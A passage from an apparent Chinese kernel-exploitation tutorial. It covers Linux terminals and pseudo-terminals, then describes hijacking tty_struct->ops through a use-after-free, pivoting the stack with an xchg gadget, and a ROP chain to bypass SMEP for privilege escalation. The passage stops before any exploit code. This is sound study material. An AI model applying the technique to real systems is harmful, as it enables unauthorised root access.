<blockquote>
<p>注意：以下这些类型的终端不一定在所有发行版 linux 上都存在，例如 <code>/dev/ttyprintk</code> 就不存在于我的 kali linux 上。</p>
</blockquote>
<ol>
<li>
<p>串行端口终端 （<strong>/dev/ttySn</strong>） ：是用于与串行端口连接的终端设备，类似于 Windows 下的 COM。</p>
</li>
<li>
<p>控制终端 （<strong>/dev/tty</strong>） ：<strong>当前进程</strong>的控制终端设备文件，类似于符号链接，会具体对应至某个实际终端文件。</p>
<blockquote>
<p>可以使用 <code>tty</code> 命令查看其具体对应的终端设备，也可以使用 <code>ps -ax</code> 来查看进程与控制终端的映射关系。</p>
</blockquote>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211007225628587.png" alt="image-20211007225628587"></p>
<blockquote>
<p>在 qemu 下，可以通过指定<code>-append 'console=ttyS0'</code> 参数，设置 linux kernel tty 映射至 <code>/dev/ttySn</code> 上。</p>
</blockquote>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211007230821016.png" alt="image-20211007230821016"></p>
</li>
<li>
<p>虚拟终端与控制台 （<strong>/dev/ttyN, /dev/console</strong>） ：在Linux 系统中，计算机显示器通常被称为<strong>控制台终端</strong> (Console)。而在 linux <strong>初始字符界面</strong>下，为了同时处理多任务，自然需要多个终端的切换。这些终端由于是用软件来模拟以前硬件的方式，是虚拟出来的，因此也称为<strong>虚拟终端</strong>。</p>
<blockquote>
<p>虚拟终端和控制台的差别需要参考历史。在以前，终端是通过串口连接上的，不是计算机本身就有的设备，而控制台是计算机本身就有的设备，一个计算机只有一个控制台。</p>
<p>简单的说，<strong>控制台是直接和计算机相连接的原生设备，终端是通过电缆、网络等等和主机连接的设备</strong></p>
<p>计算机启动的时候，所有的信息都会显示到控制台上，而不会显示到终端上。也就是说，控制台是计算机的基本设备，而终端是附加设备。</p>
<p>由于控制台也有终端一样的功能，控制台有时候也被模糊的统称为终端。</p>
<p>计算机操作系统中，与终端不相关的信息，比如内核消息，后台服务消息，都可以显示到控制台上，但不会显示到终端上。</p>
<p>由于时代的发展，硬件资源的丰富，终端和控制台的概念已经慢慢淡化。</p>
</blockquote>
<p>这种虚拟终端的切换与我们X11中图形界面中多个终端的切换不同，它属于<strong>更高级别终端的切换</strong>。我们日常所使用的图形界面下的终端，属于某个<strong>虚拟图形终端界面</strong>下的多个<strong>伪终端</strong>。</p>
<p>可以通过键入 <code>Ctrl+Alt+F1</code> （其中的 F<strong>x</strong> 表示切换至第 <strong>x</strong> 个终端，例如 F1）来切换虚拟终端。</p>
<blockquote>
<p>tty0则是当前所使用虚拟终端的一个别名，系统所产生的信息会发送到该终端上。</p>
</blockquote>
<p>默认情况下，F1-F6均为字符终端界面，F7-F12为图形终端界面。</p>
<blockquote>
<p>当切换至字符终端界面后，可再次键入 <code>Ctrl+Alt+F7</code>切回图形终端界面。</p>
</blockquote>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211007231737902.png" alt="image-20211007231737902"></p>
</li>
<li>
<p>伪终端 （<strong>/dev/pty</strong>）：<strong>伪终端(Pseudo Terminal)<strong>是成对的</strong>逻辑</strong>终端设备，其行为与普通终端非常相似。所不同的是伪终端没有对应的硬件设备，主要目的是实现双向信道，为其他程序提供终端形式的接口。</p>
<p>当我们远程连接到主机时，与主机进行交互的终端的类型就是伪终端，而且日常使用的图形界面中的多个终端也全都是伪终端。</p>
<p>伪终端的两个终端设备分别称为 master 设备和 slave 设备，其中 slave 设备的行为与普通终端无异。</p>
<p>当某个程序把某个 master 设备看作终端设备并进行读写，则该读写操作将实际反应至该逻辑终端设备所对应的另一个 slave 设备。通常 slave 设备也会被其他程序用于读写。因此这两个程序便可以通过这对逻辑终端来进行通信。</p>
<p>现代 linux 主要使用 <strong>UNIX 98 pseudoterminals</strong> 标准，即 <strong>pts(pseudo-terminal slave, /dev/pts/n)</strong> 和 <strong>ptmx(pseudo-terminal master, /dev/ptmx)</strong> 搭配来实现 pty。</p>
<p>伪终端的使用一会将在下面详细说明。</p>
</li>
<li>
<p>其他终端 （诸如 <strong>/dev/ttyprintk</strong> 等等）。这类终端通常是用于特殊的目的，例如 <strong>/dev/ttyprintk</strong> 直接与内核缓冲区相连：</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211007233344098.png" alt="image-20211007233344098"></p>
</li>
</ol>
<h5 id="2-伪终端的使用">2) 伪终端的使用</h5>
<p>伪终端的具体实现分为两种</p>
<ul>
<li>UNIX 98 pseudoterminals，涉及 <code>/dev/ptmx</code> （master）和 <code>/dev/pts/*</code>（slave）</li>
<li>老式 BSD pseudoterminals，涉及 <code>/dev/pty[p-za-e][0-9a-f]</code>(master) 和 <code>/dev/tty[p-za-e][0-9a-f]</code>(slave)</li>
</ul>
<p>这里我们只介绍 UNIX 98 pseudoterminals。</p>
<p><code>/dev/ptmx</code>这个设备文件主要用于打开一对伪终端设备。当某个进程 open 了 <code>/dev/ptmx</code>后，该进程将获取到一个指向 <strong>新伪终端master设备（PTM）</strong> 的文件描述符，同时对应的 <strong>新伪终端slave设备（PTS）</strong> 将在 <code>/dev/pts/</code>下被创建。不同进程打开 <code>/dev/ptmx</code> 后所获得到的 PTM、PTS 都是互不相同的。</p>
<p>进程打开 /dev/ptmx 有两种方式</p>
<ol>
<li>
<p>手动使用 <code>open(&quot;/dev/ptmx&quot;, O_RDWR | O_NOCTTY)</code> 打开</p>
</li>
<li>
<p>通过标准库函数 <code>getpt</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE             <span class="comment">/* See feature_test_macros(7) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getpt</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>通过标准库函数 <code>posix_openpt</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">posix_openpt</span><span class="params">(<span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<blockquote>
<p>上述几种方式完全等价，只是<strong>使用标准库函数</strong>的方式会更通用一点，因为 ptmx 在某些 linux 发行版上可能不位于 <code>/dev/ptmx</code>，同时标准库函数还会做其他额外的检测逻辑。</p>
</blockquote>
<p>进程可以调用<code>ptsname(ptm_fd)</code>来获取到对应的 PTS 的路径。</p>
<p>需要注意的是，必须先顺序调用以下两个函数后才能打开 PTS:</p>
<ol>
<li><code>grantpt(ptm_fd)</code>：更改 slave 的模式和所有者，获取其所有权</li>
<li><code>unlockpt(ptm_fd)</code>：对 slave 解锁</li>
</ol>
<p>伪终端主要用于两个应用场景</p>
<ul>
<li>终端仿真器，为其他远程登录程序（例如 ssh）提供终端功能</li>
<li>可用于向<strong>通常拒绝从管道读取输入</strong>的程序（例如 su 和 passwd）发送输入</li>
</ul>
<p>上述几步是使用伪终端所必须调用的一些底层函数。但在实际的伪终端编程中，更加常用的是以下几个函数：</p>
<blockquote>
<p>我们可以通过阅读这些函数的源代码来了解伪终端的使用方式。</p>
</blockquote>
<ul>
<li>
<p><code>openpty</code>：找到一个空闲的伪终端，并将打开好后的 master 和 slave 终端的文件描述符返回。源代码如下:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Create pseudo tty master slave pair and set terminal attributes</span></span><br><span class="line"><span class="comment">   according to TERMP and WINP.  Return handles for both ends in</span></span><br><span class="line"><span class="comment">   AMASTER and ASLAVE, and return the name of the slave end in NAME.  */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">openpty (<span class="keyword">int</span> *amaster, <span class="keyword">int</span> *aslave, <span class="keyword">char</span> *name,</span><br><span class="line">  <span class="keyword">const</span> struct termios *termp, <span class="keyword">const</span> struct winsize *winp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PATH_MAX</span></span><br><span class="line">  <span class="keyword">char</span> _buf[PATH_MAX];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">char</span> _buf[<span class="number">512</span>];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">char</span> *buf = _buf;</span><br><span class="line">  <span class="keyword">int</span> master, ret = <span class="number">-1</span>, slave = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  *buf = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">  master = getpt ();</span><br><span class="line">  <span class="keyword">if</span> (master == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (grantpt (master))</span><br><span class="line">    <span class="keyword">goto</span> on_error;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (unlockpt (master))</span><br><span class="line">    <span class="keyword">goto</span> on_error;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> TIOCGPTPEER</span></span><br><span class="line">  <span class="comment">/* Try to allocate slave fd solely based on master fd first. */</span></span><br><span class="line">  slave = ioctl (master, TIOCGPTPEER, O_RDWR | O_NOCTTY);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (slave == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Fallback to path-based slave fd allocation in case kernel doesn't</span></span><br><span class="line"><span class="comment">       * support TIOCGPTPEER.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span> (pts_name (master, &amp;buf, <span class="keyword">sizeof</span> (_buf)))</span><br><span class="line">        <span class="keyword">goto</span> on_error;</span><br><span class="line"></span><br><span class="line">      slave = open (buf, O_RDWR | O_NOCTTY);</span><br><span class="line">      <span class="keyword">if</span> (slave == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">goto</span> on_error;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* XXX Should we ignore errors here?  */</span></span><br><span class="line">  <span class="keyword">if</span> (termp)</span><br><span class="line">    tcsetattr (slave, TCSAFLUSH, termp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> TIOCSWINSZ</span></span><br><span class="line">  <span class="keyword">if</span> (winp)</span><br><span class="line">    ioctl (slave, TIOCSWINSZ, winp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  *amaster = master;</span><br><span class="line">  *aslave = slave;</span><br><span class="line">  <span class="keyword">if</span> (name != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (*buf == <span class="string">'\0'</span>)</span><br><span class="line">        <span class="keyword">if</span> (pts_name (master, &amp;buf, <span class="keyword">sizeof</span> (_buf)))</span><br><span class="line">          <span class="keyword">goto</span> on_error;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">strcpy</span> (name, buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> on_error:</span><br><span class="line">  <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">    close (master);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (slave != <span class="number">-1</span>)</span><br><span class="line">      close (slave);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (buf != _buf)</span><br><span class="line">    <span class="built_in">free</span> (buf);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>login_tty</code>：用于实现在指定的终端上启动登录会话。源代码如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">login_tty</span> <span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 启动新会话</span></span><br><span class="line">  (<span class="keyword">void</span>) setsid();</span><br><span class="line">    <span class="comment">// 设置为当前 fd 为控制终端</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> TIOCSCTTY</span></span><br><span class="line">  <span class="keyword">if</span> (ioctl(fd, TIOCSCTTY, (<span class="keyword">char</span> *)<span class="literal">NULL</span>) == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* This might work.  */</span></span><br><span class="line">    <span class="keyword">char</span> *fdname = ttyname (fd);</span><br><span class="line">    <span class="keyword">int</span> newfd;</span><br><span class="line">    <span class="keyword">if</span> (fdname)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (fd != <span class="number">0</span>)</span><br><span class="line">    (<span class="keyword">void</span>) close (<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (fd != <span class="number">1</span>)</span><br><span class="line">    (<span class="keyword">void</span>) close (<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (fd != <span class="number">2</span>)</span><br><span class="line">    (<span class="keyword">void</span>) close (<span class="number">2</span>);</span><br><span class="line">        newfd = open (fdname, O_RDWR);</span><br><span class="line">        (<span class="keyword">void</span>) close (newfd);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">while</span> (dup2(fd, <span class="number">0</span>) == <span class="number">-1</span> &amp;&amp; errno == EBUSY)</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">while</span> (dup2(fd, <span class="number">1</span>) == <span class="number">-1</span> &amp;&amp; errno == EBUSY)</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">while</span> (dup2(fd, <span class="number">2</span>) == <span class="number">-1</span> &amp;&amp; errno == EBUSY)</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> (fd &gt; <span class="number">2</span>)</span><br><span class="line">    (<span class="keyword">void</span>) close(fd);</span><br><span class="line">  <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>forkpty</code>：整合了<code>openpty</code>, <code>fork</code> 和 <code>login_tty</code>，在网络服务程序可用于为新登录用户打开一对伪终端，并创建相应的会话子进程。源代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">forkpty (<span class="keyword">int</span> *amaster, <span class="keyword">char</span> *name, <span class="keyword">const</span> struct termios *termp,</span><br><span class="line">   <span class="keyword">const</span> struct winsize *winp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> master, slave, pid;</span><br><span class="line">  <span class="comment">// 启动新 pty</span></span><br><span class="line">  <span class="keyword">if</span> (openpty (&amp;master, &amp;slave, name, termp, winp) == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (pid = fork ())</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">      close (master);</span><br><span class="line">      close (slave);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="comment">/* Child.  */</span></span><br><span class="line">      close (master);</span><br><span class="line">      <span class="keyword">if</span> (login_tty (slave))</span><br><span class="line">  _exit (<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="comment">/* Parent.  */</span></span><br><span class="line">      *amaster = master;</span><br><span class="line">      close (slave);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> pid;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="3-tty-struct-结构的利用">3) tty_struct 结构的利用</h5>
<p>当我们执行 <code>open(&quot;/dev/ptmx&quot;, flag)</code> 时，内核会通过以下函数调用链，分配一个 <code>struct tty_struct</code> 结构体：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ptmx_open (drivers/tty/pty.c)</span><br><span class="line">-&gt; tty_init_dev (drivers/tty/tty_io.c)</span><br><span class="line">  -&gt; alloc_tty_struct (drivers/tty/tty_io.c)</span><br></pre></td></tr></table></figure>
<p><code>struct tty_struct</code> 的结构如下所示：</p>
<blockquote>
<p>sizeof(struct tty_struct) == 0x2e0</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span>  magic;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">  <span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">  <span class="keyword">spinlock_t</span> ctrl_lock;</span><br><span class="line">  <span class="keyword">spinlock_t</span> flow_lock;</span><br><span class="line">  <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>  <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">64</span>];</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>    <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">  <span class="keyword">int</span> count;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>    <span class="comment">/* winsize_mutex */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> stopped:<span class="number">1</span>,  <span class="comment">/* flow_lock */</span></span><br><span class="line">          flow_stopped:<span class="number">1</span>,</span><br><span class="line">          unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">int</span> hw_stopped;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ctrl_status:<span class="number">8</span>,  <span class="comment">/* ctrl_lock */</span></span><br><span class="line">          packet:<span class="number">1</span>,</span><br><span class="line">          unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">  <span class="keyword">int</span> flow_change;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">  <span class="keyword">int</span> alt_speed;    <span class="comment">/* For magic substitution of 38400 bps */</span></span><br><span class="line">  <span class="keyword">wait_queue_head_t</span> write_wait;</span><br><span class="line">  <span class="keyword">wait_queue_head_t</span> read_wait;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">  <span class="keyword">void</span> *disc_data;</span><br><span class="line">  <span class="keyword">void</span> *driver_data;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> closing;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;</span><br><span class="line">  <span class="keyword">int</span> write_cnt;</span><br><span class="line">  <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>注意到第五个字段 <code>const struct tty_operations *ops</code>，<code>struct tty_operations</code>结构体实际上是多个函数指针的集合：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">      <span class="title">struct</span> <span class="title">inode</span> *<span class="title">inode</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">  <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">  <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">  <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">          <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">  <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">  <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">  <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">  <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">  <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">  <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">  <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">  <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">  <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">  <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">  <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">  <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">  <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">        struct serial_icounter_struct *icount);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">  <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">  <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">  <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>我们可以试着通过 UAF, 修改<strong>新</strong>分配的 tty_struct 上的 <code>const struct tty_operations *ops</code>，使其指向一个伪造的 <code>tty_operations</code>结构体，这样就可以搭配一些操作（例如 open、ioctl 等等）来劫持控制流。</p>
<blockquote>
<p>注：tty_operations 函数指针的使用，位于<code>drivers/tty/tty_io.c</code>的各类 <code>tty_xxx</code>函数中。</p>
</blockquote>
<p>但由于开启了 SMEP 保护，此时的控制流<strong>只能在内核代码中执行</strong>，不能跳转至用户代码。</p>
<h5 id="4-ROP-利用">4) ROP 利用</h5>
<p>为了达到提权目的，我们需要完成以下几件事情：</p>
<ol>
<li>提权</li>
<li>绕过 SMEP，执行用户代码</li>
</ol>
<h6 id="4-1-劫持栈指针">4.1) 劫持栈指针</h6>
<p>我们需要通过 ROP 来完成上述操作，但问题是，<strong>用户无法控制内核栈</strong>。因此我们必须使用一些特殊 gadget 来<strong>将栈指针劫持到用户空间</strong>，之后再利用用户空间上的 ROP 链进行一系列控制流跳转。</p>
<p>获取 gadget 的方式有很多。可以使用之前用的 <code>ROPgadget</code> 工具，优点是可以将分析结果通过管道保存至文件中，但缺点是该工具在 kernel 层面上会跑的很慢。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary vmlinux</span><br></pre></td></tr></table></figure>
<p>有个速度比较快的工具可以试试，那就是 <code>ropper</code>工具：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install ropper</span><br><span class="line">ropper --file vmlinux --console</span><br></pre></td></tr></table></figure>
<p>我们可以手动构造一个 <strong>fake_tty_operations</strong>，并修改其中的 <code>write</code> 函数指针指向一个 xchg 指令。这样当对 <code>/dev/ptmx</code> 执行 write 操作时，内核就会通过以下调用链：</p>
<blockquote>
<p><code>tty_write</code> -&gt; <code>do_tty_write</code> -&gt; <code>do_tty_write</code> -&gt; <code>n_tty_write</code> -&gt;  <code>tty-&gt;ops-&gt;write</code></p>
</blockquote>
<p>进一步使用到 <code>tty-&gt;ops-&gt;write</code>函数指针，最终执行 <code>xchg</code> 指令。</p>
<p>但问题是，执行什么样的 xchg 指令？通过动态调试与 IDA 静态分析，最终找到了实际调用 <code>tty-&gt;ops-&gt;write</code>的指令位置：</p>
